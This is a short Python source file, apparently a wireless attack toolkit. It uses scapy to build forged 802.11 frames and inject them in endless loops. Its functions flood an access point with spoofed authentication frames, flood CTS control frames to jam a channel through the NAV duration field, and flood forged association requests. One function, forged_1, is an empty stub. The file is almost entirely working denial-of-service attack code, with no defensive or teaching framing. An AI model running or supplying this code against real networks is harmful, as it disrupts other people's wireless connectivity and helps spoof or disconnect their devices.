import subprocess

from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq


def auth_attack(interface, sta, ap):
    pkt = Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
          Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
    while True:
        interface.inject(pkt)


def forged_1(interface, sta, ap):
    pass


def cts_nav_attack(interface, target_mac):
    # http://matej.sustr.sk/publ/articles/cts-dos/cts-dos.en.html
    # pkt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
    pkt = RadioTap() / \
          Dot11(ID=0x7d00, type='Control', subtype=12, addr1=target_mac)
    while True:
        interface.inject(pkt)


def sa_query_attack(interface, ap, sta):
    pkt = Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
          Dot11AssoReq(cap=0x1100, listen_interval=0x000a)
    while True:
        interface.inject(pkt)
